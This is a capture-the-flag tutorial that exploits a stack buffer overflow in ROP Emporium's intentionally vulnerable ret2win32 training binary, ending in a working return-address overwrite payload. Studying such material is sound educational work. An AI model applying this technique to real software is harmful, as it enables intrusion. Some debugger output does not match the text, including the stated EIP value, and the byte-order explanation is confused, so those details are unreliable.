Hey there! This is my second writeup about stack based buffer overflows!

## Introduction to buffer overflows
So what is a buffer overflow? A buffer overflow is an anomaly whereby a program, while writing [data](https://en.wikipedia.org/wiki/Data_(computing) "Data (computing)") to a [buffer](https://en.wikipedia.org/wiki/Data_buffer "Data buffer"), overruns the buffer's boundary and overwrites adjacent [memory](https://en.wikipedia.org/wiki/Main_memory "Main memory") locations. 
Buffers are areas of memory set aside to hold data, often while moving it from one section of a program to another, or between programs. 
An anomalous transaction that produces more data could cause it to write past the end of the buffer. If this overwrites adjacent data or executable code, this may result in erratic program behavior.
One can exploit the behaviour of a buffer overflow, to write malicious data in locations known to hold executable code.
![buffer overflow](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Buffer_overflow_basicexample.svg/220px-Buffer_overflow_basicexample.svg.png)

## Getting our hands dirty
For this writeup we are going to use the vulnerable `ret2win32` executable from ropemporium.com. 
To solve this challeng we are supposed to retrieve the contents of a file named `flag.txt` from a remote machine by exploiting the given binary.
Lets download the executable using `wget`

```
$ wget https://ropemporium.com/binary/ret2win32.zip
```

Now lets unzip it with `unzip`

```
$ unzip ret2win32.zip
Archive:  ret2win32.zip
  inflating: ret2win32               
  extracting: flag.txt
```

Alright. We now have a `flag.txt` and a `ret2win32` executable.
To exploit a buffer overflow we generally use the following roadmap:
- overflow the buffer of the vulnerable program
- find the **EIP offset**
- create shellcode to exploit the program or use a **ret2** based attack (from the challenges name I think it is already pretty clear what we are going to use)

#### EIP (Extended Instruction Pointer)
EIP is a pointer that tells the computer where to go next to execute the next instruction and therefore controls the flow of a program.

#### Return Address
The return address causes execution to leave the current subroutine and resume at the point in the code immediately after the instruction who called it. The return address is saved by the calling routine on the stack or in a register (**EIP**)

#### RET2 Attack
When overflowing the buffer important data on the stack are overwritten. One important piece of data that gets overwritten is the **ret**urn address. From the definition above you can understand the importance of it. With that in mind, if we can inject our own malicious return address we can call a function that was never meant to be called.

### Peeking inside
Firstly lets see why we are going to use a `ret2` based attack instead of injecting our own shellcode.
For this we will use the `checksec` tool. You can install it with:

```
$ sudo apt install checksec
```

And use it with:

```
$ checksec --file=ret2win32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               3               ret2win32
```

We can see that the NX bit (no execute) is set. That means we can not inject malicious code (shellcode) because it will simply be ignored. Therefore we can try a `ret2` based attack.
By digging further we can suppose that in the future we will be able to easily obtain and examine the functions since the application is not stripped. We can confirm this by using the `file` command as shown below:

```
$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
```

After running `strings` on it we can in fact see that a call to `/bin/cat` is made to read the flag.

```
$ strings ret2win32
[ . . . ]
ret2win by ROP Emporium
Exiting
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!
Thank you!
Well done! Here's your flag:
/bin/cat flag.txt
[ . . . ]
```

### Exploiting
Firstly lets overflow the program.

```
$ ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

>
```

Okay this is exactly what we were talking about. The program will try to store 56 bytes into a 32 byte buffer. 
To overflow the program we will use `python2` to generate garbage data that exceed the buffers capacity and pipe them to `ret2win32` 

```
$ python2 -c "print('A' * 100)" | ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
zsh: done                python2 -c "print('A' * 100)" | 
zsh: segmentation fault  ./ret2win32
```

And thats it! Nothing special right? Now lets hop on `gdb` (**G**NU project **d**e**b**ugger) and figure out the offset.

> Note that for this writeup we will be using gdb-ped a **p**ython **e**xploit **d**evelopment **a**ssistance for gdb
> Setup with:
> 
> git clone https://github.com/longld/peda.git ~/peda  
   echo "source ~/peda/peda.py" >> ~/.gdbinit
>

```
$ apt install gdb
[ . . . ]
$ gdb -q ret2win32 # Quiet mode to only show usable output
Reading symbols from ret2win32...
(No debugging symbols found in ret2win32)
gdb-peda$
```

Lets create a pattern we will use to overflow the program and store it inside of a file

```
[ . . . ]
gdb-peda$ pattern create 100 pattern.txt
```

Now if we run it using the pattern we just created as an input we should see the program crashing.

```bash
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xf7e1cff4 --> 0x21cd8c 
ECX: 0xf7e1e9b8 --> 0x0 
EDX: 0x1 
ESI: 0x8048660 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x72742074 ('t tr')
ESP: 0xffffcf80 (" I will ")
EIP: 0x2c6b6369 ('ick,')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x2c6b6369
[------------------------------------stack-------------------------------------]
0000| 0xffffcf80 (" I will ")
0004| 0xffffcf84 ("ill ")
0008| 0xffffcf88 --> 0x0 
0012| 0xffffcf8c --> 0xf7c23295 (add    esp,0x10)
0016| 0xffffcf90 --> 0x0 
0020| 0xffffcf94 --> 0x70 ('p')
0024| 0xffffcf98 --> 0xf7ffcff4 --> 0x33f14 
0028| 0xffffcf9c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x2c6b6369 in ?? ()
```

We see that the **EIP** holds the value of `0x41414641`
Now lets find out the offset.

```
[ . . . ]
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

Great! Now we can test that the overwrite is succesfully performed.
Lets exit the debugger and use our friend python once again!

```
$ python -c "print('A' * 44 + 'XXXX')" | ./ret2win32
```

Lets confirm that by using `dmesg`

```
$ sudo dmesg | grep "ret2win32" 
[ 2528.792825] ret2win32[12762]: segfault at 41414141 ip 0000000041414141 sp 00000000ffc8d060 error 14 in libc.so.6[f7c00000+22000]
[ 3820.251164] ret2win32[19756]: segfault at 6d656f6a ip 000000006d656f6a sp 00000000ffa8f4f0 error 14 in libc.so.6[f7c00000+22000]
[ 4247.031253] ret2win32[21831]: segfault at 38307830 ip 0000000038307830 sp 00000000ffdbd000 error 14 in libc.so.6[f7c00000+22000]
[ 4662.822376] ret2win32[23813]: segfault at 486c22c ip 000000000486c22c sp 00000000ff8dd2d0 error 14 in ret2win32[8048000+1000]
[ 4758.433194] ret2win32[24259]: segfault at 486c22c ip 000000000486c22c sp 00000000ffab6840 error 14 in ret2win32[8048000+1000]
[ 4776.570734] ret2win32[24334]: segfault at a ip 000000000000000a sp 00000000ff9ad164 error 14 in ret2win32[8048000+1000]
[ 7464.158324] ret2win32[37172]: segfault at 41414141 ip 0000000041414141 sp 00000000ffc03f30 error 14 in libc.so.6[f7c00000+22000]
[ 8672.349293] ret2win32[42552]: segfault at 42424242 ip 0000000042424242 sp 00000000ff828f60 error 14 in libc.so.6[f7c00000+22000]
```

Now that we are sure we can control the execution flow of this program lets analyze the program a bit more. To do that we will once again fire up gdb:

```
$ gdb -q ret2win32
Reading symbols from ret2win32...
(No debugging symbols found in ret2win32)
```

Now lets view what functions are available for us.

```
[ . . . ]
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
```

`pwnme` function is interesting. Lets take a look at it by disassembling it.

```
[ . . . ]
gdb-peda$ disas pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:     push   ebp
   0x080485ae <+1>:     mov    ebp,esp
   0x080485b0 <+3>:     sub    esp,0x28
   0x080485b3 <+6>:     sub    esp,0x4
   0x080485b6 <+9>:     push   0x20
   0x080485b8 <+11>:    push   0x0
   0x080485ba <+13>:    lea    eax,[ebp-0x28]
   0x080485bd <+16>:    push   eax
   0x080485be <+17>:    call   0x8048410 <memset@plt>
   0x080485c3 <+22>:    add    esp,0x10
   0x080485c6 <+25>:    sub    esp,0xc
   0x080485c9 <+28>:    push   0x8048708
   0x080485ce <+33>:    call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:    add    esp,0x10
   0x080485d6 <+41>:    sub    esp,0xc
   0x080485d9 <+44>:    push   0x8048768
   0x080485de <+49>:    call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:    add    esp,0x10
   0x080485e6 <+57>:    sub    esp,0xc
   0x080485e9 <+60>:    push   0x8048788
   0x080485ee <+65>:    call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:    add    esp,0x10
   0x080485f6 <+73>:    sub    esp,0xc
   0x080485f9 <+76>:    push   0x80487e8
   0x080485fe <+81>:    call   0x80483c0 <printf@plt>
   0x08048603 <+86>:    add    esp,0x10
   0x08048606 <+89>:    sub    esp,0x4
   0x08048609 <+92>:    push   0x38
   0x0804860b <+94>:    lea    eax,[ebp-0x28]
   0x0804860e <+97>:    push   eax
   0x0804860f <+98>:    push   0x0
   0x08048611 <+100>:   call   0x80483b0 <read@plt>
   0x08048616 <+105>:   add    esp,0x10
   0x08048619 <+108>:   sub    esp,0xc
   0x0804861c <+111>:   push   0x80487eb
   0x08048621 <+116>:   call   0x80483d0 <puts@plt>
   0x08048626 <+121>:   add    esp,0x10
   0x08048629 <+124>:   nop
   0x0804862a <+125>:   leave  
   0x0804862b <+126>:   ret    
End of assembler dump.
```

We can see there are lots of `call` instructions followed by `push` instructions. Typically this indicates that these are arguments to the function that was called.
Lets examine one of the arguments using `x/s` (display memory contents of a given address as a string)

```
[ . . . ]
gdb-peda$ x/s 0x8048788
0x8048788:      "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
```

Thats right! The pushed address is likely an argument to the `printf` c function.
This function is the one that prints some text to the screen and asks us for the input.
So maybe it isn't the one we want.

Lets examine the `ret2win` function.

```
gdb-peda$ disas ret2win
Dump of assembler code for function ret2win:
   0x0804862c <+0>:     push   ebp
   0x0804862d <+1>:     mov    ebp,esp
   0x0804862f <+3>:     sub    esp,0x8
   0x08048632 <+6>:     sub    esp,0xc
   0x08048635 <+9>:     push   0x80487f6
   0x0804863a <+14>:    call   0x80483d0 <puts@plt>
   0x0804863f <+19>:    add    esp,0x10
   0x08048642 <+22>:    sub    esp,0xc
   0x08048645 <+25>:    push   0x8048813
   0x0804864a <+30>:    call   0x80483e0 <system@plt>
   0x0804864f <+35>:    add    esp,0x10
   0x08048652 <+38>:    nop
   0x08048653 <+39>:    leave  
   0x08048654 <+40>:    ret    
End of assembler dump.
```

Did you notice something already? That is the call to `0x80483e0`. We can clearly see it calls the `system` function. `system` is a c function to execute commands in the terminal of the OS. I am guessing that the only reason this call was ever made was to read the `flag.txt` file. Since this is dead code though it was never called. Thats where the **RET2** attack comes to play.

#### Creating the final exploit
We want to overflow the stack **just** enough so that afterwards we can overwrite the return address stored in the **EIP** with the address of the `ret2win` function.

To get the address of the `ret2win` function we can just scroll further to the output of `info function` or use gdb's `p` command if we are filling extra cool. Personally I do so here it goes (you should to! You just learnt about buffer overflows and how to exploit them :D ):

```
[ . . . ]
gdb-peda$ p ret2win
$1 = {<text variable, no debug info>} 0x804862c <ret2win>
```

Now lets exit gdb for good and craft our exploit.
Since this program is 32bit we will need to add a null byte first (`0x0804862c`) and afterwards **reverse** it. So the final address will be `0x2c860408`.

```
$ python2 -c "print('A' * 44 + '\x2c\x86\x04\x08')" | ./ret2win32
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
zsh: done                python2 -c "print('A' * 44 + '\x2c\x86\x04\x08')" | 
zsh: segmentation fault  ./ret2win32
```

And we get the flag!!!
Now give your self some pats in the back! You are awesome :D 
I hope in this writeup you:
- Understood what a buffer overflow is
- Roughly how the execution flow of a program works
- What is the EIP and its offset
- What is the return address and why it is so important
- How to exploit the behaviour of a buffer overflow to your advantage!

If you liked this writeup please star the repository so more people can see it!